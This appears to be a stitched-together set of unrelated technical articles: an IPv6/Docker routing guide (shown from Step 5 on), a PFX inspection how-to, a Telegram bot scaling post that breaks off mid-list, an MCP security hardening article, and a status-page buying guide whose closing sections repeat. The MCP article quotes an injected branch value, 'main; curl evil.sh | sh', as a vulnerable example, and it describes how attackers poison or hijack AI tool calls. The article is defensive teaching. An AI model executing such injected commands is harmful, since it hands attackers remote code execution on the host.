Step 5: Enable IPv6 Forwarding and Handle Router Advertisements

To route native IPv6 subnets to Docker or VMs, the server must act as a router. Enabling IPv6 forwarding in Linux modifies how the kernel handles Router Advertisements (RA).

If your provider supplies the default IPv6 gateway through Router Advertisements, configure accept_ra=2 on the upstream-facing interface when IPv6 forwarding is enabled. If your provider uses a statically configured gateway, this setting may not be necessary.

Create a persistent sysctl configuration:

cat <<EOF > /etc/sysctl.d/99-ipv6-routing.conf
net.ipv6.conf.ens3.accept_ra=2
net.ipv6.conf.all.forwarding=1
EOF

Apply the settings and verify your default route was not lost:

Set accept_ra=2 only if your provider supplies the default IPv6 gateway through Router Advertisements. This setting allows the interface to accept Router Advertisements even when IPv6 forwarding is enabled. If your provider uses a statically configured gateway, this setting is generally unnecessary.

Enabling net.ipv6.conf.all.forwarding=1 enables IPv6 forwarding system-wide. Configure firewall rules to prevent unintended forwarding between network interfaces.

sysctl -p /etc/sysctl.d/99-ipv6-routing.conf
sysctl net.ipv6.conf.all.forwarding
sysctl net.ipv6.conf.ens3.accept_ra
ip -6 route show default

Step 6: Route a /64 Subnet to Docker Containers

With forwarding enabled, you can delegate a full /64 (e.g., 2001:db8:abcd:d0c::/64) to Docker.

Requirement: This requires Docker Engine 27.0 or later. Verify your version before proceeding:

docker version

Create a routed Docker network:

docker network create --ipv6 --subnet 2001:db8:abcd:d0c::/64 \
  -o com.docker.network.bridge.gateway_mode_ipv6=routed pub6

Important: Configure Upstream IPv6 Routing

Docker automatically creates the local bridge network and its associated routes, but it does not configure your provider's upstream router. Before expecting external IPv6 connectivity, make sure your provider routes the Docker container's /64 subnet through the server's primary IPv6 address. Without the correct upstream route, containers may communicate locally but remain unreachable from external IPv6 networks.

Deploy a container with a static public IPv6 address:

docker run -d --name web-node1 --network pub6 \
  --ip6 2001:db8:abcd:d0c::80 -p 80:80 nginx:alpine

Security note: Published Docker ports may be accessible externally over IPv4 or IPv6, depending on the network configuration. Only publish the ports required by your application and configure appropriate firewall restrictions.

Understanding Dual-Stack Port Publishing (-p 80:80): In IPv6 routed mode, Docker exposes the published container port directly on the container's native IPv6 address. The host port specified with -p is not used for IPv6 routed-mode access. However, because the network retains Docker's default IPv4 NAT mode, that same -p 80:80 mapping successfully publishes the port on the host's IPv4 address.

Step 7:Configure Proxy NDP (Only When Required)

Whether you need Proxy NDP depends entirely on your provider's routing architecture:

  • Provider routes /48 through server's primary IPv6: Not normally required.
  • Provider treats the container addresses as on-link: May be required.
  • Provider supplies a separately routed /64 through the server: Not normally required.

If your provider expects Layer 2 MAC resolution for the delegated IPs, you must enable Proxy NDP on the external interface and proxy the specific container address:

sysctl -w net.ipv6.conf.ens3.proxy_ndp=1
ip -6 neigh add proxy 2001:db8:abcd:d0c::80 dev ens3

To ensure these neighbour entries survive a server reboot, configure a systemd oneshot service to restore them during the boot sequence.

Step 8: Configure IPv6 Firewall Rules

Without NAT, your IPv6 addresses are publicly routable

Rule 1: Do not indiscriminately block ICMPv6

Essential ICMPv6 messages are required for Neighbor Discovery (NDP), Path MTU Discovery, and other core IPv6 network functions.

Rule 2: Host Firewall Configuration

Before adding firewall rules, identify the zone assigned to your network interface:

firewall-cmd --get-active-zones

Use the actual active zone assigned to your interface when adding firewall rules. Do not assume that the interface belongs to the public zone.

If the active zone is public, use the following command as shown. Otherwise, replace public with the actual zone name reported by firewall-cmd --get-active-zones.

firewall-cmd --zone=public --add-rich-rule='rule family="ipv6" destination address="2001:db8:abcd:1::10" port port="80" protocol="tcp" accept' --permanent
firewall-cmd --reload

Rule 3: Container Firewall Configuration

Docker manages firewall rules for bridge networks, including published ports and container traffic filtering. Firewalld integrates with Docker through its dedicated docker zone and forwarding policies.

For additional access restrictions, configure the appropriate firewall rules based on your active Docker firewall backend:

  • With Docker's iptables backend, the DOCKER-USER chain can be used to apply custom filtering rules.
  • With the nftables backend (introduced as experimental in Engine 29), use separate nftables filtering chains instead.

not assume that host-level Firewalld rich rules automatically filter all forwarded traffic to Docker containers. Verify the effective IPv6 forwarding and firewall policies before exposing containers publicly.

Step 9: Verify IPv6 Addresses, Routes, and Connectivity

Use these diagnostic commands to separate IP assignment issues from routing failures:

Check assigned addresses, routing table, and default gateway:

ip -6 addr show dev ens3
ip -6 route
ip -6 route show default

Check which route Linux selects for an external destination:

ip -6 route get 2606:4700:4700::1111

Check Docker network routing and container port mappings:

docker network inspect pub6
docker container inspect web-node1 --format '{{json .NetworkSettings.Ports}}'

Test outbound and inbound connectivity:

Test inbound IPv6 connectivity from a separate device or server with working IPv6 connectivity. Testing from the same server does not confirm that the provider's upstream routing and external firewall configuration are working correctly.

# Outbound test from the server
curl -6 https://api64.ipify.org

# Inbound test (Run this from a separate external IPv6-connected machine)
curl -6 http://[2001:db8:abcd:d0c::80]/

Troubleshooting Common IPv6 Routing Problems

  • Small packets work, but large TCP transfers stall: Check whether ICMPv6 "Packet Too Big" messages are being blocked. IPv6 Path MTU Discovery relies on these messages to determine the appropriate packet size along the network path.
  • Ping works, but TCP connections time out: Check Firewalld rules, Docker published ports, container service status, and upstream routing before assuming an ICMPv6 problem.
  • Containers cannot reach the internet: Verify IPv6 forwarding, the upstream default route, and the source address configuration. If the gateway is learned through Router Advertisements, confirm that accept_ra=2 is configured on the correct interface when forwarding is enabled.
  • External networks cannot reach containers: Confirm that the provider routes the Docker subnet to the server. If the subnet is treated as on-link, verify Proxy NDP and the corresponding neighbour entries.

title: How to Inspect a PFX or P12 File Without Exporting the Private Key
summary:
Someone hands you a .pfx file and asks whether it’s the right certificate for a deployment. Before extracting anything, check what the bundle contains.

openssl pkcs12 -in bundle.p12 -info -noout

OpenSSL prompts for the archive password and reports the bag types and encryption algorithms. A Shrouded Keybag indicates an encrypted private-key bag. Certificate bag lines indicate certificates. The -noout flag suppresses credential output.

Check the certificate’s DNS names and expiry

For an archive with one identity, extract the public certificate and inspect it:

openssl pkcs12 -in bundle.p12 -clcerts -nokeys -out leaf.pem
openssl x509 -in leaf.pem -noout -subject -issuer -dates -ext subjectAltName

Check the Subject Alternative Name against the hostname your client uses. Check both validity dates, especially if the certificate was just issued. If the archive contains several identities, match the certificate to the expected entry before running openssl x509, which reads the first certificate in the PEM file.

What if OpenSSL reports RC2-40-CBC?

For a legacy archive you’re authorized to inspect, try loading the legacy provider for this command:

openssl pkcs12 -legacy -in bundle.p12 -info -noout

If the consuming application supports modern PKCS#12 encryption, re-export the archive with modern defaults and verify the certificate and chain before switching over.

I maintain PKIScope. The original PFX/P12 guide also covers inspecting intermediates and comparing the archive with what your TLS server actually presents.

title: Running hundreds of Telegram bots on one Node.js server: 8 lessons from production
summary:
Most Telegram bot tutorials end at "it works for one bot". Our platform runs a few hundred merchant bots (shops, paid channels, AI assistants) from one Node.js cluster, and almost every hard bug we hit only appeared at that scale. Here are the lessons, in the order they hurt.

1. One process cannot own every bot: shard by bot

A single Node process runs out of event-loop headroom long before it runs out of memory. We run one primary process plus a pool of worker processes, and each bot belongs to exactly one worker. The reverse proxy routes every webhook request to the worker that owns that bot (a stable hash of the bot id), so a bot's updates are always handled in one place, in order, with its in-memory state.

The rule that keeps this sane: anything that must happen once (schedulers, reminders, cleanup jobs) runs only on the primary, and every worker checks "do I own this bot?" before acting.

2. Start bots slowly, or Telegram will rate-limit all of them

On boot, the naive code calls getMe and setWebhook for every bot at once. With hundreds of bots that is a burst of thousands of requests, and Telegram answers with 429 Too Many Requests and a retry_after that can lock bots out for minutes. Every restart degraded every bot.

Fixes that worked:

  • Cache getMe results in the database and only refresh them in the background.
  • Check getWebhookInfo first and call setWebhook only when the URL or settings are actually wrong.
  • Spread the remaining calls over time with a small queue, and honour retry_after when it is short. Give up and retry later when it is long.

3. Answer the webhook fast and do the work after

Telegram waits for your HTTP response. If your handler awaits a database call, an AI model or a file upload before answering, slow requests pile up and Telegram starts retrying, so you get the same update twice.

Reply 200 as soon as the update is validated and queued, then process it. The exception is payments: save a pre_checkout_query or a successful payment durably before you answer, because that is the one place where losing an update costs real money.

4. Deduplicate updates by update_id

Retries, restarts and proxy hiccups all produce duplicates. Keep the last few thousand update_ids per bot (an LRU in memory is enough for most of them) and drop repeats before any handler runs. For anything that moves money, add a second, durable "processed" table keyed by the callback or payment id, so a duplicate can never pay out twice even across a restart.

5. Use secret_token on every webhook

title: Securing MCP in Production
summary:
More than 30 CVEs were filed against MCP servers, clients, and tooling in a roughly two-month window in early 2026. The most common pattern — around four in ten — was plain command injection. The August 2026 batch reads like a web-security syllabus: path traversal in an Atlassian integration, a settings tool that leaked a cluster token, SSRF in an ad-platform server, CSRF in a WordPress plugin.

MCP doesn't introduce new vulnerability classes so much as it removes the friction that used to contain old ones. A conventional API takes input from clients you can authenticate and rate-limit. An MCP tool's arguments are composed by a model that has read whatever text happened to be in its context — a ticket description, a scraped web page, another tool's output. The caller is authenticated; the content of the call is not trustworthy.

The Six Attack Surfaces

Every MCP deployment has six places an attack can land:

# Surface Primary control
1 Tool definitions Pin approved definitions by hash
2 Tool arguments Validate, no shell, allowlists
3 Tool results Treat output as untrusted; sanitize
4 Credentials Token exchange, short TTL, file-mounted secrets
5 Supply chain Digest pinning, signature verification
6 Egress Egress allowlist, metadata endpoint blocked

Surfaces 2, 4, and 6 are the ones that chain together in real incidents: an injectable argument lets an attacker run a command, which reads a static secret or calls the node metadata endpoint. Closing any one link breaks the chain — which is why the controls are layered rather than alternatives.

Arguments Are Untrusted Input

Many MCP servers are thin wrappers around CLIs, which is exactly where the injection CVEs concentrate — including the widely deployed mcp-remote package (CVE-2025-6514, CVSS 9.6).

// Vulnerable: attacker-influenced string reaches a shell
exec(`git log --oneline ${args.branch}`);   // "main; curl evil.sh | sh"

// Safer: no shell, argument vector, strict allowlist, flag-injection guard
const BRANCH_RE = /^[A-Za-z0-9._\/-]{1,100}$/;
if (!BRANCH_RE.test(args.branch) || args.branch.startsWith("-")) {
  throw new McpError("invalid_argument", 400);
}
execFile("git", ["log", "--oneline", "--end-of-options", args.branch],
         { cwd: repoDir, timeout: 10_000 });

Dropping the shell isn't enough on its own. A value starting with - is parsed as a flag, so --end-of-options and the leading-dash check matter even with execFile. The same discipline applies to file paths — compare the resolved path, not the string, to defeat symlink and .. tricks:

async function resolveInside(root: string, userPath: string): Promise<string> {
  const full = await realpath(resolve(root, userPath));
  const base = await realpath(root);
  if (full !== base && !full.startsWith(base + sep)) {
    throw new McpError("invalid_argument", 400);
  }
  return full;
}

For SSRF, use a per-tool host allowlist — not a denylist of "bad" IPs. A tool that calls one CRM API has no business fetching arbitrary URLs.

Credentials: the Lifecycle, Not the Vault

An October 2025 audit of more than 5,200 open-source MCP servers found that 53% rely on static API keys or personal access tokens, and 79% pass secrets through environment variables. Environment variables surface in kubectl describe, crash dumps, /proc, and every child process — so a command-injection bug turns "can run a command" into "can read every secret the server holds."

Three rules cover most of the ground.

Exchange, don't forward. Token passthrough is prohibited by the specification. Use RFC 8693 token exchange to trade the inbound token for one narrowed to a single downstream audience and scope:

curl -s -X POST https://idp.example.com/oauth2/token \
  -d grant_type=urn:ietf:params:oauth:grant-type:token-exchange \
  -d subject_token="$INBOUND_TOKEN" \
  -d subject_token_type=urn:ietf:params:oauth:token-type:access_token \
  -d audience=https://api.crm.example.com \
  -d scope=records.read

The result is useless against any other API, so an injected call can't pivot to a different downstream.

Mount secrets as files, not variables. Pull secrets from AWS Secrets Manager or Azure Key Vault through the Secrets Store CSI driver and read per call, so rotation takes effect without a restart:

// Read per call: a rotated secret is picked up without a pod restart
const crmKey = () => readFile("/mnt/secrets/crm-api-key", "utf8");

Keep lifetimes short. Because stateless transport evaluates identity on every request, revoking an inbound token takes effect on the next call — but only if the downstream token minted from it expires on a comparable timescale (minutes, not hours).

Tool Definitions Are a Supply Chain Too

The harder variant of tool poisoning is the rug pull: a server passes review, runs cleanly for weeks, then changes a definition without anyone re-approving it. The control that works regardless of how the payload is hidden is to pin what was approved and refuse anything else:

function definitionHash(t: ToolDefinition): string {
  const canonical = canonicalJson({
    name: t.name,
    description: t.description,
    inputSchema: t.inputSchema,
    annotations: t.annotations ?? {},
  });
  return createHash("sha256").update(canonical).digest("hex");
}

async function admitTools(serverId: string, listed: ToolDefinition[]) {
  const approved = await registry.approvedHashes(serverId);
  return listed.filter((t) => {
    const ok = approved.get(t.name) === definitionHash(t);
    if (!ok) audit.warn("tool_definition_changed", { serverId, tool: t.name });
    return ok;
  });
}

Anything not approved never reaches the model's context, and a changed definition is quarantined until a human re-approves it.

Container and Network Hardening

Three controls bound the damage when an argument does slip through.

Strip the pod's privileges:

securityContext:
  runAsNonRoot: true
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  capabilities: { drop: ["ALL"] }
  seccompProfile: { type: RuntimeDefault }

Block the node metadata endpoint. SSRF is dangerous mostly because of where it leads — 169.254.169.254, which is how a server-side request becomes stolen cloud credentials. IRSA and Workload Identity use projected tokens and don't need node metadata access, so blocking it is safe:

apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata-endpoint
  namespace: mcp-tenant-acme
spec:
  podSelector: {}
  policyTypes: [Egress]
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except: ["169.254.169.254/32"]

On EKS, setting the IMDSv2 hop limit to 1 on the nodes adds a second barrier.

Pin and verify the image. Deploy by digest, not tag, and sign in CI so admission can reject anything unsigned. A Kyverno or Sigstore policy-controller admission rule on the MCP namespaces enforces verification at the cluster boundary.

Where to Start

Order Control Effort
1 Argument validation: no shell, path containment, host allowlists Low, code-only
2 Move secrets from env vars to file mounts Low
3 Block the metadata endpoint Low, one policy
4 Container hardening (securityContext) Low
5 Token exchange with audience scoping Medium
6 Definition pinning and image signing Medium

The first four fit in a single sprint and don't require touching the identity provider or the CI pipeline.

title: How to Choose a Status Page and Incident Communication Tool for a SaaS Business
summary:
Every online product has bad days. A database slows down, a third-party service fails, or a deployment goes wrong. What customers remember is often less about the outage itself and more about how you communicated during it. A clear, honest status page can turn a frustrating incident into a moment that builds trust, while silence floods your support inbox and social feeds with the same question: "Is it down?"

Status page and incident communication tools make that communication fast and consistent. This guide explains how to choose one that fits a small or growing SaaS business without overbuying.

Decide what you need to communicate, and to whom

Start by clarifying your audiences. Most businesses have at least two:

  • Customers, who want to know whether the product works, what is affected and when it will be fixed
  • Internal teams, such as support, sales and leadership, who need to answer customer questions accurately

Some businesses also need private status pages for specific enterprise customers or partners, or separate pages for different products or regions. Write down which of these apply to you now and which may apply within a year. That list will shape which plan tier you need more than any feature comparison.

Define your components

A status page usually breaks your product into components, such as the web app, API, mobile app, login, payments or email delivery. Customers can then see that, for example, the API is degraded while the web app is fine.

Before evaluating tools, sketch your component list. Keep it understandable from a customer's point of view rather than mirroring your internal architecture. Then check how each tool handles components, including grouping, regional breakdowns and how many components your plan allows.

Core features to evaluate

Incident creation and updates

During an incident, speed matters and stress is high. Creating an incident, choosing affected components, setting a status and posting an update should take seconds. Look for saved templates for common incident types so the on-call person is not writing from scratch at 3 a.m.

Subscriber notifications

Customers should be able to subscribe to updates by email and often through other channels such as SMS, chat tools, RSS or webhooks. Check which channels are included in your plan, whether subscribers can choose specific components, and whether there are limits on subscriber counts or notifications.

Scheduled maintenance

Planned maintenance deserves the same clear communication as incidents. A good tool lets you schedule maintenance windows in advance, notify subscribers automatically and update the status when the work starts and finishes.

Uptime display and history

Many status pages show historical uptime per component and a log of past incidents. This transparency can reassure prospects during evaluation, but only if the numbers are accurate. Understand where uptime data comes from: manual updates, automated monitoring or a combination.

Branding and custom domain

Your status page should look like part of your product, typically on a subdomain such as status.yourdomain.com. Check support for custom domains, logos, colors and HTTPS on the plan you are considering.

Monitoring and automation

Some status page tools include their own uptime monitoring, while others integrate with monitoring and alerting services you already use. Automation can update component status when a monitor fails, but be careful: fully automatic public updates can cause confusion if a monitor flaps or produces a false alarm.

A common middle ground is to let monitoring trigger internal alerts and draft incidents, with a person confirming before anything goes public. Ask each vendor how their automation handles false positives and whether you can require human approval.

Internal coordination features

Communicating with customers is only half the job. Look at how the tool supports your team during an incident:

  • Integration with team chat so updates appear where responders already work
  • Links to on-call or alerting tools so the right person is notified
  • Role permissions so only authorized people can publish public updates
  • A timeline of what was posted and when, useful for post-incident reviews

If you already use a dedicated incident management or on-call tool, check whether it includes a status page feature. Using one combined tool may be simpler than connecting two separate ones, but compare the depth of the status page features before deciding.

Pricing considerations

Pricing for status page tools often depends on:

  • Number of subscribers or notifications
  • Number of team members or seats
  • Private or audience-specific pages
  • Number of components or pages
  • Notification channels, such as SMS, which may carry extra costs

A free or entry-level plan can be enough for an early-stage product with a public page and email notifications. As your customer base grows, subscriber limits and private pages tend to push you into higher tiers. Estimate your subscriber count and growth before committing to annual billing, and ask what happens if you exceed a limit mid-term.

Run a realistic trial

Test a shortlisted tool the way you will actually use it:

  1. Set up your real components and connect a custom domain if the trial allows it.
  2. Subscribe a few team members through each channel you plan to offer.
  3. Run a mock incident from start to resolution, including several updates.
  4. Schedule a test maintenance window and confirm the notifications arrive on time.
  5. Check the mobile experience, since customers often check status pages on their phones.
  6. Review the internal side, including chat notifications and permission controls.

Time how long it takes a teammate who did not set up the tool to post an update. If it is not obvious under calm conditions, it will be harder during a real incident. If you want a broader view of how tools in this category compare, detailed reviews of monitoring and DevOps tools can help you narrow a shortlist before you start trials.

Writing good incident updates

Even the best tool cannot rescue vague communication. A few habits make a big difference:

  • Acknowledge the problem quickly, even before you know the cause.
  • Say what customers will notice, in plain language rather than internal jargon.
  • Give a time for the next update, and keep that promise even if there is no news.
  • Confirm when the issue is resolved and, for significant incidents, share a short summary of what happened and what you are changing.

Saved templates in your status page tool can encode these habits so they happen consistently.

Final thoughts

Choosing a status page and incident communication tool comes down to understanding your audiences, defining clear components, and making updates fast and dependable under pressure. Look closely at subscriber notifications, automation controls, internal coordination and how pricing scales with your customer base. Run a realistic mock incident before you commit, and pair the tool with clear communication habits so customers always know what is going on.

Asit Upadhyay is the founder of GeekyBuzz, where he reviews SaaS and AI tools.

  • Links to on-call or alerting tools so the right person is notified
  • Role permissions so only authorized people can publish public updates
  • A timeline of what was posted and when, useful for post-incident reviews

Pricing for status page tools often depends on:

  • Number of subscribers or notifications
  • Number of team members or seats
  • Private or audience-specific pages
  • Number of components or pages
  • Notification channels, such as SMS, which may carry extra costs

Run a realistic trial

Test a shortlisted tool the way you will actually use it:

  1. Set up your real components and connect a custom domain if the trial allows it.
  2. Subscribe a few team members through each channel you plan to offer.
  3. Run a mock incident from start to resolution, including several updates.
  4. Schedule a test maintenance window and confirm the notifications arrive on time.
  5. Check the mobile experience, since customers often check status pages on their phones.
  6. Review the internal side, including chat notifications and permission controls.

Even the best tool cannot rescue vague communication. A few habits make a big difference:

  • Acknowledge the problem quickly, even before you know the cause.
  • Say what customers will notice, in plain language rather than internal jargon.
  • Give a time for the next update, and keep that promise even if there is no news.
  • Confirm when the issue is resolved and, for significant incidents, share a short summary of what happened and what you are changing.

Saved templates in your status page tool can encode these habits so they happen consistently.

Final thoughts

Choosing a status page and incident communication tool comes down to understanding your audiences, defining clear components, and making updates fast and dependable under pressure. Look closely at subscriber notifications, automation controls, internal coordination and how pricing scales with your customer base. Run a realistic mock incident before you commit, and pair the tool with clear communication habits so customers always know what is going on.
